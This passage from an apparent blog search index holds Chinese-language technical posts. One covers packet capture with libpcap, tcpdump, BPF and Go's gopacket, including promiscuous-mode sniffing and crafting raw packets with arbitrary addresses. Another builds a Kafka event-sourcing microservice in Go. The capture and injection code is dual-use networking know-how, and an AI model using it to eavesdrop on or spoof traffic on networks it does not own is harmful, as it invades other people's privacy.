%s\n", error_buffer); return 1; &#125; /*Open device for live capture*/ handle = pcap_open_live( device, BUFSIZ, packet_count_limit, timeout_limit, error_buffer ); /*Attempt to capture one packet. If there is no network traffic and the timeout is reached, it will return NULL*/ packet = pcap_next(handle, &amp;packet_header); if (packet == NULL) &#123; printf("No packet found.\n"); return 2; &#125; /*Our function to output some info*/ print_packet_info(packet, packet_header); return 0;&#125;void print_packet_info(const u_char \*packet, struct pcap_pkthdr packet_header) &#123; printf("Packet capture length: %d\n", packet_header.caplen); printf("Packet total length %d\n", packet_header.len);&#125; Debug Tools12345#Older versions of tcpdump truncate packets to 68 or 96 bytes.#If this is the case, use -s to capture full-sized packets:$ tcpdump -i &lt;interface&gt; -s 65535 -w &lt;some-file&gt;# A packet capturing tool similar to TcpDump for Solaris$ snoop -r -o arp11.snoop -q -d nxge0 -c 150000 tcpdumptcpdump 是一个运行在命令行下的嗅探工具。它允许用户拦截和显示发送或收到过网络连接到该计算机的TCP/IP和其他数据包。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息，从而使用户能够进一步找出问题的根源。可以使用 BPF 来限制tcpdump产生的数据包数量。 snoopsnoop uses both the network packet filter and streams buffer modules to provide efficient capture of packets from the network. Captured packets can be displayed as they are received, or saved to a file for later inspection. promiscuous mode抓包工具需要工作在promiscuous mode(混杂模式)（superuser）， 指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。当网卡工作在混杂模式下时，网卡将来自接口的所有数据都捕获并交给相应的驱动程序。一般在分析网络数据作为网络故障诊断手段时用到，同时这个模式也被网络黑客利用来作为网络数据窃听的入口。 BPFBerkeley Packet Filter，缩写BPF，是类Unix系统上数据链路层的一种接口，提供原始链路层封包的收发。BPF支持“过滤”封包，这样BPF会只把“感兴趣”的封包到上层软件，可以避免从操作系统内核向用户态复制其他封包，降低抓包的CPU的负担以及所需的缓冲区空间，从而减少丢包率。BPF的过滤功能是以BPF虚拟机机器语言的解释器的形式实现的，这种语言的程序可以抓取封包数据，对封包中的数据采取算术操作，并将结果与常量或封包中的数据或结果中的测试位比较，根据比较的结果决定接受还是拒绝封包。 Go PacketFind Devices123456789101112131415161718192021222324252627282930313233343536package mainimport ( "fmt" "log" "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap")func main() &#123; fmt.Println("----------Find all devices---------\n ") devices, err := pcap.FindAllDevs() if err != nil &#123; log.Fatal(err) &#125; // Print device information for _, device := range devices &#123; for _, address := range device.Addresses &#123; fmt.Println("- IP address: ", address.IP) fmt.Println("- Subnet mask: ", address.Netmask) &#125; &#125; /*- IP address: 45.33.110.101 - Subnet mask: ffffff00 - IP address: 2600:3c01::f03c:91ff:fee5:45b6 - Subnet mask: ffffffffffffffff0000000000000000 - IP address: fe80::f03c:91ff:fee5:45b6 - Subnet mask: ffffffffffffffff0000000000000000 - IP address: 127.0.0.1 - Subnet mask: ff000000 - IP address: ::1 - Subnet mask: ffffffffffffffffffffffffffffffff */&#125; Decoding Packet Layers 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package mainimport ( "fmt" "log" "net" "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap")func main()&#123; handle, err := pcap.OpenLive("eth0", 65536, true, pcap.BlockForever) if err != nil &#123; fmt.Printf("Error: %s\n", err) return &#125; defer handle.Close() //Create a new PacketDataSource src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet) //Packets returns a channel of packets in := src.Packets() for &#123; var packet gopacket.Packet select &#123; //case &lt;-stop: //return case packet = &lt;-in: arpLayer := packet.Layer(layers.LayerTypeARP) if arpLayer == nil &#123; continue &#125; arp := arpLayer.(*layers.ARP) if net.HardwareAddr(arp.SourceHwAddress).String() == "abc" &#123; //Do something or don't &#125; tcpLayer := packet.Layer(layers.LayerTypeTCP) if tcpLayer == nil &#123; continue &#125; tcp := tcpLayer.(*layers.TCP) ...... &#125; &#125;&#125; Creating and Sending Packets123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap" "log" "net" "time")var ( device string = "eth0" snapshot_len int32 = 1024 promiscuous bool = false err error timeout time.Duration = 30 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer options gopacket.SerializeOptions)func main() &#123; // Open device handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout) if err != nil &#123;log.Fatal(err) &#125; defer handle.Close() // Send raw bytes over wire rawBytes := []byte&#123;10, 20, 30&#125; err = handle.WritePacketData(rawBytes) if err != nil &#123; log.Fatal(err) &#125; // Create a properly formed packet, just with // empty details. Should fill out MAC addresses, // IP addresses, etc. buffer = gopacket.NewSerializeBuffer() gopacket.SerializeLayers(buffer, options, &amp;layers.Ethernet&#123;&#125;, &amp;layers.IPv4&#123;&#125;, &amp;layers.TCP&#123;&#125;, gopacket.Payload(rawBytes), ) outgoingPacket := buffer.Bytes() // Send our packet err = handle.WritePacketData(outgoingPacket) if err != nil &#123; log.Fatal(err) &#125; // This time lets fill out some information ipLayer := &amp;layers.IPv4&#123; SrcIP: net.IP&#123;127, 0, 0, 1&#125;, DstIP: net.IP&#123;8, 8, 8, 8&#125;, &#125; ethernetLayer := &amp;layers.Ethernet&#123; SrcMAC: net.HardwareAddr&#123;0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA&#125;, DstMAC: net.HardwareAddr&#123;0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD&#125;, &#125; tcpLayer := &amp;layers.TCP&#123; SrcPort: layers.TCPPort(4321), DstPort: layers.TCPPort(80), &#125; // And create the packet with the layers buffer = gopacket.NewSerializeBuffer() gopacket.SerializeLayers(buffer, options, ethernetLayer, ipLayer, tcpLayer, gopacket.Payload(rawBytes), ) outgoingPacket = buffer.Bytes()&#125; Capture Packet Workflow Getting a list of network devices Capturing packets from a network device Analyzing packet layers Using Berkeley Packet Filters Demo &amp; Repository using libpcap c packet sniffer code c scala native libpcap gopacket goProbe Application qisniff 新一代Ntopng网络流量监控—可视化和架构分析 ntop:pf_ring ntop:pf_ring zero copy jaseywang:pf_ring对网络抓包性能的提升 胥峰(盛大游戏)：网络分析技术之葵花宝典 基于网络抓包实现kubernetes中微服务的应用级监控 拓展话题：SDN 网络中的可视化与数据封包 DPDK(Data Plane Development Kit)运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。 专题合辑：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港警务处网络安全与科技罪案总警司 参考文献 (推荐)Packet Capture, Injection, and Analysis with Gopacket (推荐)The BSD Packet Filter:A New Architecture for User-level Packet Capture Programming with Libpcap - Sniffing the Network From Our Own Application docs.oracle:Monitoring Packet Transfers With the snoop Command MOTS(Man-on-the-Side)：一种隐秘的攻击 (推荐)Deep dive into QUANTUM INSERT YouTube:Capturing with Wireshark’s tshark Using tshark to Watch and Inspect Network Traffic tcpdump：理论、自动抓包及业务架构树的生成]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:数学与算法]]></title>
    <url>%2F2017%2F06%2F14%2FMathmetics%2F</url>
    <content type="text"><![CDATA[摘要 数学工具 学习笔记 读书笔记|数学之美（Beauty Of Mathmetics） 算法 Leetcode 编程训练 Leetcode这个网站上的题都是一些经典的公司用来面试应聘者的面试题，很多人通过刷这些题来应聘一些喜欢面试算法的公司 掌握算法是IT工程师的基本功 掌握优点和缺点:折中的思维不仅体现在算法上，在架构上也是一样的。 通过图上推演来思考:推荐自己画图，然后向别人说明。先从基本操作入手，再掌握更详细的操作和异常操作，不要试图一下子理解所有细致末节。 日常生活中的算法例子 比较算法优劣:我们会忽略一些微小的系统开销。我们应该关注的是随着数据个数的变化，所花费的时间会以怎样的曲线发生变化。因为有一些算法，在数据只有一两个的时候性能很好，但是当数据个数达到几千到几万的时候，性能会急剧下降。 评价算法的指标 通过复杂度来评价算法 掌握算法要靠编程:对于新人来说，编程经验不足会成为瓶颈.没有编程经验，就无法进行整体的把握，不能举一反三，只能死记硬背。 算法例子:数组、链表、树、散列算法、队列、栈、排序、缓存、锁 统计学 Why Not to Trust Statistics 参考文献 概率学：http://www.wzchen.com/s/probability_cheatsheet.pdf 线性代数：https://minireference.com/static/tutorials/linear_algebra_in_4_pages.pdf 统计学：http://web.mit.edu/~csvoss/Public/usabo/stats_handout.pdf 微积分：http://tutorial.math.lamar.edu/getfile.aspx?file=B,41,N 程序员学数学读哪些书？| 图灵教育]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源架构技术漫谈：基于Kafka构建事件溯源模式的微服务]]></title>
    <url>%2F2017%2F06%2F12%2FOpenSource-Kafka-Microservice%2F</url>
    <content type="text"><![CDATA[概要本文中我们将讨论如何借助 Kafka 实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 第一部分 引子、环境准备、整体设计及实现 第二部分 消息消费者及其集群化 第三部分 测试驱动开发、Docker部署和持续集成 第一部分 引子、环境准备、整体设计及实现为什么需要微服务微服务本身并不算什么新概念，它要解决的问题在软件工程历史中早已经有人提出：解耦、扩展性、灵活性，解决“烂架构”膨胀后带来的复杂度问题。 Conway’s law（康威定律） Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.（任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致）– Melvyn Conway, 1967 《人月神话》：Adding manpower to a late software project makes it later –Fred Brooks, (1975) 为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。 微服务 (Microservices)是解决这些困难的众多方案之一。它本质上是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模组化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent/Language agnostic) 的 API 集相互通讯。 Event Sourcing（事件溯源）真正构建一个微服务是非常具有挑战性的。其中一个最重要的挑战就是原子化————如何处理分布式数据，如何设计服务的粒度。例如，常见的客户、工单场景，如果拆分成两个服务，查询都变成了一个难题：12345select * from order o, customer c where o.customer_id = c.id and o.gross_amount &gt; 50000 and o.status = 'PAID' and c.country = 'INDONESIA'; 在DDD领域（Domain-Driven Design，领域驱动设计）有一种架构风格被广泛应用，即CQRS （Command Query Responsibility Seperation，命令查询职责分离）。CQRS最核心的概念是Command、Event，“将数据(Data)看做是事实(Fact)。每个事实都是过去的痕迹，虽然这种过去可以遗忘，但却无法改变。” 这一思想直接发展了Event Source，即将这些事件的发生过程记录下来，使得我们可以追溯业务流程。CQRS对设计者的影响，是将领域逻辑，尤其是业务流程，皆看做是一种领域对象状态迁移的过程。这一点与REST将HTTP应用协议看做是应用状态迁移的引擎，有着异曲同工之妙。 实现方案Kafka in a NutshellApache Kafka是由Apache软件基金会开发的一个开源消息中间件项目，由Scala写成。Kafka最初是由LinkedIn开发，并于2011年初开源。2012年10月从Apache Incubator毕业。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。Kafka使用Zookeeper作为其分布式协调框架，很好的将消息生产、消息存储、消息消费的过程结合在一起。同时借助Zookeeper，kafka能够生产者、消费者和broker在内的所以组件在无状态的情况下，建立起生产者和消费者的订阅关系，并实现生产者与消费者的负载均衡。 Kafka Core WordsBroker:Kafka集群包含一个或多个服务器，这种服务器被称为brokerTopic:每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic。Topic相当于数据库中的Table，行数据以log的形式存储，非常类似Git中commit log。物理上不同Topic的消息分开存储，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处。Partition:Parition是物理上的概念，每个Topic包含一个或多个Partition.Producer:消息生产者，负责发布消息到Kafka brokerConsumer:消息消费者，向Kafka broker读取消息的客户端。Consumer Group：每个Consumer属于一个特定的Consumer Group（可为每个Consumer指定group name，若不指定则属于默认的group）。 整体设计案例：假设一个银行账户系统。经过一段时间的经营发展，该行客户数量和交易规模都有了巨大的增长，系统内部变得异常复杂，每一个部分都变得沉重不堪。我们尝试对他的业务单元进行解耦，例如将余额计算逻辑从原有的核心系统拆分出来。根据银行账户业务特点，我们设计一个生产者——负责根据业务事件触发生成一个事件，所有事件基于Kafka存储，再设计一个消费者——负责从Kafka抓去未处理事件，通过调用业务逻辑处理单元完成后续持久化操作。这样一个账户的所有业务操作都可以有完整的快照历史，符合金融业务Audit（审计）的需要。而且通过使用事件，我们可以很方便地重建数据。 业务事件列表： CreateEvent：开户 DepositEvent：存款 WithdrawEvent：取款 TransferEvent：转账 领域模型：账户（Account）holder’s name:持有人名称balance：余额registration date：开户日期…… 领域模型：事件（Event）name:事件名称ID：序号…… 环境准备 第一步，启动ZooKeeper: 123456$ wget http://mirror.bit.edu.cn/apache/kafka/0.10.1.0/kafka_2.10-0.10.1.0.tgz$ tar -xvf kafka_2.10-0.10.1.0.tgz$ cd kafka_2.10-0.10.1.0$ bin/zookeeper-server-start.sh config/zookeeper.properties$ netstat -an | grep 2181tcp46 0 0 *.2181 *.* LISTEN 第二步，启动Kafka 12345678910$ bin/kafka-server-start.sh config/server.properties [2017-06-13 14:03:08,168] INFO New leader is 0 (kafka.server.ZookeeperLeaderElector$LeaderChangeListener)[2017-06-13 14:03:08,172] INFO Kafka version : 0.10.1.0 (org.apache.kafka.common.utils.AppInfoParser)[2017-06-13 14:03:08,172] INFO Kafka commitId : 3402a74efb23d1d4 (org.apache.kafka.common.utils.AppInfoParser)[2017-06-13 14:03:08,173] INFO [Kafka Server 0], started (kafka.server.KafkaServer)$ lsof -nP -iTCP -sTCP:LISTEN | sort -n$ netstat -an | grep 9092 tcp46 0 0 *.9092 *.* LISTEN 第三步，创建topic 123$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partition 1 --topic x-microservice-transactions-t1Created topic "x-microservice-transactions-t1". 另外，运行多个Kafka 实例Kafka多实例非常简单，只需要复制文件 server.properties，稍作修改即可。12345678910111213config/server-1.properties: broker.id=1 listeners=PLAINTEXT://:9093 log.dir=/tmp/kafka-logs-1config/server-2.properties: broker.id=2 listeners=PLAINTEXT://:9094 log.dir=/tmp/kafka-logs-2// 启动多个broker,须指定不同的属性文件$ bin/kafka-server-start.sh config/server-1.properties$ bin/kafka-server-start.sh config/server-2.properties domain model123456789101112131415package main// domain model: bank_account.gotype BankAccount struct &#123; Id string Name string Balance int&#125;//定义下列函数：//1. FetchAccount(id) 从Redis读取账户实例信息//2. updateAccount(id, data) 更新指定账户信息//3. ToAccount(map) 将从Redis读到的账户信息转换为模型数据，return *BankAccount object. Kafka &amp; Redis library12345678910111213141516171819202122// main.goimport ( "github.com/go-redis/redis" // Redis通讯库：go-redis)var ( Redis = initRedis())func initRedis() *redis.Client &#123; redisUrl := os.Getenv("REDIS_URL") if redisUrl == "" &#123; redisUrl = "127.0.0.1:6379" &#125; return redis.NewClient(&amp;redis.Options&#123; Addr: redisUrl, Password: "", DB: 0, &#125;)&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344package main//kafka.goimport ( "encoding/json" "fmt" "github.com/Shopify/sarama" //Kafka通讯库：Sarama "os")var ( brokers = []string&#123;"127.0.0.1:9092"&#125; topic = "go-microservice-transactions" topics = []string&#123;topic&#125;)func newKafkaConfiguration() *sarama.Config &#123; conf := sarama.NewConfig() conf.Producer.RequiredAcks = sarama.WaitForAll conf.Producer.Return.Successes = true conf.ChannelBufferSize = 1 conf.Version = sarama.V0_10_1_0 return conf&#125;func newKafkaSyncProducer() sarama.SyncProducer &#123; kafka, err := sarama.NewSyncProducer(brokers, newKafkaConfiguration()) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; return kafka&#125;func newKafkaConsumer() sarama.Consumer &#123; consumer, err := sarama.NewConsumer(brokers, newKafkaConfiguration()) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; return consumer&#125; 消息生产者Producer1234567891011121314151617181920212223242526272829303132333435363738394041package main//消息生产者 producer.goimport ( "bufio" "fmt" "os" "strconv" "strings")func mainProducer() &#123; var err error reader := bufio.NewReader(os.Stdin) kafka := newKafkaSyncProducer() for &#123; fmt.Print("-&gt; ") text, _ := reader.ReadString('\n') text = strings.Replace(text, "\n", "", -1) args := strings.Split(text, "###") cmd := args[0] switch cmd &#123; case "create": if len(args) == 2 &#123; accName := args[1] event := NewCreateAccountEvent(accName) sendMsg(kafka, event) &#125; else &#123; fmt.Println("Only specify create###Account Name") &#125; default: fmt.Printf("Unknown command %s, only: create, deposit, withdraw, transfer\n", cmd) &#125; if err != nil &#123; fmt.Printf("Error: %s\n", err) err = nil &#125; &#125;&#125; 1234567891011121314151617181920212223242526// kafka.go// 增加发送消息的方法func sendMsg(kafka sarama.SyncProducer, event interface&#123;&#125;) error &#123; json, err := json.Marshal(event) if err != nil &#123; return err &#125; msgLog := &amp;sarama.ProducerMessage&#123; Topic: topic, Value: sarama.StringEncoder(string(json)), &#125; partition, offset, err := kafka.SendMessage(msgLog) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) &#125; fmt.Printf("Message: %+v\n", event) fmt.Printf("Message is stored in partition %d, offset %d\n", partition, offset) return nil&#125; 123456package main//启动入口，main.gofunc main() &#123; mainProducer()&#125; 12345678$ go build$ ./go-microservice-&gt; createOnly specify create###Account Name-&gt; create###YanruiMessage: &#123;Event:&#123;AccId:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Type:CreateEvent&#125; AccName:Yanrui&#125;Message is stored in partition 0, offset 0-&gt; 第二部分 消息消费者Consumer及其集群化Consumer负责从Kafka加载消息队列。另外，我们需要为每一个事件创建process()函数。 123456789101112131415161718192021package main//processor.goimport ( "errors")func (e CreateEvent) Process() (*BankAccount, error) &#123; return updateAccount(e.AccId, map[string]interface&#123;&#125;&#123; "Id": e.AccId, "Name": e.AccName, "Balance": "0", &#125;)&#125;func (e InvalidEvent) Process() error &#123; return nil&#125;func (e AcceptEvent) Process() error &#123; return nil&#125;// other Process() codes ... 123456789101112131415161718192021package main//consumer.gofunc mainConsumer(partition int32) &#123; kafka := newKafkaConsumer() defer kafka.Close() //注：开发环境中我们使用sarama.OffsetOldest，Kafka将从创建以来第一条消息开始发送。 //在生产环境中切换为sarama.OffsetNewest,只会将最新生成的消息发送给我们。 consumer, err := kafka.ConsumePartition(topic, partition, sarama.OffsetOldest) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; go consumeEvents(consumer) fmt.Println("Press [enter] to exit consumer\n") bufio.NewReader(os.Stdin).ReadString('\n') fmt.Println("Terminating...")&#125; Go语言通过goroutine提供了对于并发编程的直接支持，goroutine是Go语言运行库的功能，作为一个函数入口，在堆上为其分配的一个堆栈。所以它非常廉价，我们可以很轻松的创建上万个goroutine，但它们并不是被操作系统所调度执行。除了被系统调用阻塞的线程外，Go运行库最多会启动$GOMAXPROCS个线程来运行goroutine。 goroutines: A goroutine is a lightweight thread of execution. channels: Channels are the pipes that connect concurrent goroutines. (&lt;- operator) for: for is Go’s only looping construct. Here are three basic types of for loops. select: Go’s select lets you wait on multiple channel operations. Non-Blocking Channel Operations 12345678910111213141516171819202122232425262728293031323334353637383940414243func consumeEvents(consumer sarama.PartitionConsumer) &#123; var msgVal []byte var log interface&#123;&#125; var logMap map[string]interface&#123;&#125; var bankAccount *BankAccount var err error for &#123; //goruntine exec select &#123; // blocking &lt;- channel operator case err := &lt;-consumer.Errors(): fmt.Printf("Kafka error: %s\n", err) case msg := &lt;-consumer.Messages(): msgVal = msg.Value // if err = json.Unmarshal(msgVal, &amp;log); err != nil &#123; fmt.Printf("Failed parsing: %s", err) &#125; else &#123; logMap = log.(map[string]interface&#123;&#125;) logType := logMap["Type"] fmt.Printf("Processing %s:\n%s\n", logMap["Type"], string(msgVal)) switch logType &#123; case "CreateEvent": event := new(CreateEvent) if err = json.Unmarshal(msgVal, &amp;event); err == nil &#123; bankAccount, err = event.Process() &#125; default: fmt.Println("Unknown command: ", logType) &#125; if err != nil &#123; fmt.Printf("Error processing: %s\n", err) &#125; else &#123; fmt.Printf("%+v\n\n", *bankAccount) &#125; &#125; &#125; &#125;&#125; 重构main12345678910111213141516171819202122232425262728package main//main.go//支持producer和consumer启动模式import ( "flag" ...)func main() &#123; act := flag.String("act", "producer", "Either: producer or consumer") partition := flag.String("partition", "0", "Partition which the consumer program will be subscribing") flag.Parse() fmt.Printf("Welcome to go-microservice : %s\n\n", *act) switch *act &#123; case "producer": mainProducer() case "consumer": if part32int, err := strconv.ParseInt(*partition, 10, 32); err == nil &#123; mainConsumer(int32(part32int)) &#125; &#125;&#125; 通过–act参数，可以启动一个消费者进程。当进程运行时，他将从Kafka一个一个拿出消息进行处理，按照我们之前在每个事件定义的Process() 方法。 12345678910$ go build$ ./go-microservice --act=consumerWelcome to go-microservice : consumerPress [enter] to exit consumerProcessing CreateEvent:&#123;"AccId":"49a23d27-4ffe-4c86-ab9a-fbc308ecff1c","Type":"CreateEvent","AccName":"Yanrui"&#125;&#123;Id:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Name:Yanrui Balance:0&#125;Terminating... 集群化消息消费者问题：如果一个Consumer宕机了怎么办？（例如：程序崩溃、网络异常等原因）解决方案：将多个Consumer编组为集群实现高可用。具体来说就是打标签，当有一个新的Log发送时，Kafka将其发送给其中一个实例。当该实例无法接收Log时，Kafka将Log传递给另一个包含相同标签的Consumer。注意：Kafka 版本 0.9 +，另外还需要使用sarama-cluster库 12#使用govendor获取govendor fetch github.com/bsm/sarama-cluster 1234567891011121314151617181920212223//修改mainConsumer方法使用sarama-cluster library连接Kafkaconfig := cluster.NewConfig()config.Consumer.Offsets.Initial = sarama.OffsetNewestconsumer, err := cluster.NewConsumer(brokers, "go-microservice-consumer", topics, config)//topics定义var ( topics = []string&#123;topic&#125;)//调整consumeEvents()case err, more := &lt;-consumer.Errors(): if more &#123; fmt.Printf("Kafka error: %s\n", err) &#125;//consumer.Messages() : MarkOffset//consumer.go//func mainConsumer(partition int32)consumer.MarkOffset(msg, "") //增加的行msgVal = msg.Value 即使程序崩溃，MarkOffset也会将消息标记为 processed ,标签包括元数据以及这个时间点的状态。元数据可以被另外一个Consumer恢复数据状态，也就能被重新消费。即即使同样的消息被处理两次，结果也是一样的，这个过程理论上是 幂等 的（idempotent）。 1234//运行多个consumer实例$ ./go-microservice --act=consumer$ ./go-microservice --act=consumer$ ./go-microservice --act=consumer 第三部分：测试驱动开发、Docker部署和持续集成使用vendor管理Golang项目依赖用govendor fetch 新增的第三方包直接被get到根目录的vendor文件夹下,不会与其它的项目混用第三方包，完美避免多个项目同用同一个第三方包的不同版本问题。只需要对vendor/vendor.json进行版本控制，即可对第三包依赖关系进行控制。 123456$ //$ go get -u github.com/kardianos/govendor$ cd $PROJECT_PATH$ govendor init$ govendor add +external$ 单元测试：ginkgo Test Suite ginkgo gomega 12345$ go get github.com/onsi/ginkgo/ginkgo$ go get github.com/onsi/gomega$ ginkgo bootstrapGenerating ginkgo test suite bootstrap for main in: go_microservice_suite_test.go 1234567891011121314151617181920package main_test//go_microservice_suite_test.go,单元测试类import ( "github.com/onsi/ginkgo" "github.com/onsi/gomega")var _ = Describe("Event", func() &#123; Describe("NewCreateAccountEvent", func() &#123; It("can create a create account event", func() &#123; name := "John Smith" event := NewCreateAccountEvent(name) Expect(event.AccName).To(Equal(name)) Expect(event.AccId).NotTo(BeNil()) Expect(event.Type).To(Equal("CreateEvent")) &#125;) &#125;)&#125;) 123456789$ ginkgoRunning Suite: go-microservice Suite==========================Random Seed: 1490709758Will run 1 of 1 specsRan 1 of 1 Specs in 0.000 secondsSUCCESS! -- 1 Passed | 0 Failed | 0 Pending | 0 Skipped PASSGinkgo ran 1 suite in 905.68195msTest Suite Passed 单元测试的四个阶段 Setup 启动 Execution 执行 Verification 验证 Teardown 拆卸 Docker部署Docker 容器中需要包含下列组件： Golang Redis、Kafka 微服务依赖的其它组件 在根目录创建一个Dockerfile12FROM golang:1.8.0MAINTAINER Yanrui 1234567891011121314151617181920//install our dependenciesRUN go get -u github.com/kardianos/govendorRUN go get github.com/onsi/ginkgo/ginkgoRUN go get github.com/onsi/gomega//将整个目录拷贝到容器ADD . /go/src/go-microservice//检查工作目录WORKDIR /go/src/go-microservice//安装依赖项RUN govendor sync//测试$ docker build -t go-microservice .$ docker run -i -t go-microservice /bin/bash$ ginkgo..............................Failed.......... 由于容器本地并没有一个Redis实例运行在上面，这时运行ginkgo测试就会报错。我们为什么不在这个Dockerfile中包含一个Redis呢？这就违背了Docker分层解耦的初衷，我们可以通过docker-compose将两个服务连接起来一起工作。 创建一个docker-compose.yml文件（与Dockerfile目录一致）:123456789101112version: "2.0"services: app: environment: REDIS_URL: redis:6379 build: . working_dir: /go/src/go-microservice links: - redis redis: image: redis:alpine 本地构建完成之后，再次运行 docker-compose run app ginkgo 测试通过。 Infrastructure as Code(基础设施即代码) The enabling idea of infrastructure as code is that the systems and devices which are used to run software can be treated as if they, themselves, are software. — Kief Morris 云带来的好的一方面是它让公司中的任何人都可以轻松部署、配置和管理他们需要的基础设施。虽然很多基础设施团队采用了云和自动化技术，却没有采用相应的自动化测试和发布流程。它们把这些当作一门过于复杂的脚本语言来使用。他们会为每一次具体的改动编写手册、配置文件和执行脚本，再针对一部分指定的服务器手工运行它们，也就是说每一次改动都还需要花费专业知识、时间和精力。这种工作方式意味着基础设施团队没有把他们自己从日常的重复性劳动中解放出来。目前已经有很多商业云平台提供了Docker服务，只需要将自己的 git repository 链接到平台，即可以自动帮你完成部署，在云上完成集成测试。 12docker-compose builddocker-compose run app ginkgo 扩展阅读：开源架构技术漫谈 Stack Overflow：2017年最赚钱的编程语言 DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献Theory 康威定律 Mike Amundsen 《远距离条件下的康威定律——分布式世界中实现团队构建》 Kief Morris《Infrastructure as Code - Managing Servers in the Cloud》 InfoQ:《Infrastructure as Code》书评与摘要Microservices (推荐)Martin Fowler : Microservices 李颖杰：为什么要重构到微服务（案例） Using GraphQL with Microservices in Go Event Sourcing (推荐) Writing and Testing an Event Sourcing Microservice with Kafka and Go Linkedin Profile:Adam Pahlevi Baihaqi (推荐) OKONKWO VINCENT IKEM:Building Scalable Applications Using Event Sourcing and CQRS (推荐)Microsoft Azure:Event Sourcing 张逸:对CQRS的基础理解 汤雪华：领域驱动设计之领域模型 汤雪华：什么是事件溯源（Event Sourcing） InfoQ:A Whole System Based on Event Sourcing is an Anti-PatternZookeeper &amp; Kafka Kafka QuickStart Apache.org:Kafka 0.9 Consumer Rewrite Design Quora:What is the actual role of ZooKeeper in Kafka? grokbase:Relationship between Zookeeper and Kafka 朱赟:白话 IT 之要不要从 rabbitMQ 转 kafka？]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的写作工具链]]></title>
    <url>%2F2017%2F06%2F03%2FWriting-WriterToolChain%2F</url>
